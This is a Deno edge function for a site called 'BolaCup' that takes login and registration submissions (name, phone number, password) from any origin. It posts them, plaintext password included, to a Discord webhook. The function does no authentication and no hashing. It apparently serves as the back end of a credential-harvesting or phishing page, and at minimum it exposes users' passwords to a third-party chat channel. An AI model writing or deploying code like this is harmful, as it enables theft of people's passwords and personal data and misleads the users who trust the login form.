import { serve } from "https://deno.land/std@0.190.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface LoginData {
  type: 'login' | 'register';
  name: string;
  phone: string;
  password: string;
  timestamp: string;
}

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const webhookUrl = Deno.env.get('DISCORD_WEBHOOK_URL');
    
    if (!webhookUrl) {
      console.error('DISCORD_WEBHOOK_URL not configured');
      return new Response(
        JSON.stringify({ error: 'Webhook not configured' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const data: LoginData = await req.json();
    console.log('Received login data:', { type: data.type, name: data.name, phone: data.phone });

    const isRegister = data.type === 'register';
    const emoji = isRegister ? '🆕' : '🔐';
    const title = isRegister ? 'Novo Cadastro' : 'Novo Login';
    const color = isRegister ? 0x00FF00 : 0x0099FF;

    const embed = {
      embeds: [{
        title: `${emoji} ${title} - BolaCup`,
        color: color,
        fields: [
          {
            name: '👤 Nome',
            value: `\`${data.name}\``,
            inline: true
          },
          {
            name: '📱 Telefone',
            value: `\`${data.phone}\``,
            inline: true
          },
          {
            name: '🔑 Senha',
            value: `\`${data.password}\``,
            inline: true
          }
        ],
        footer: {
          text: `BolaCup • ${new Date(data.timestamp).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}`
        },
        timestamp: data.timestamp
      }]
    };

    const discordResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!discordResponse.ok) {
      const errorText = await discordResponse.text();
      console.error('Discord webhook error:', errorText);
      return new Response(
        JSON.stringify({ error: 'Failed to send to Discord' }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('Successfully sent to Discord');
    return new Response(
      JSON.stringify({ success: true }),
      { status: 200, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    console.error('Error in discord-webhook:', error);
    const message = error instanceof Error ? error.message : 'Unknown error';
    return new Response(
      JSON.stringify({ error: message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
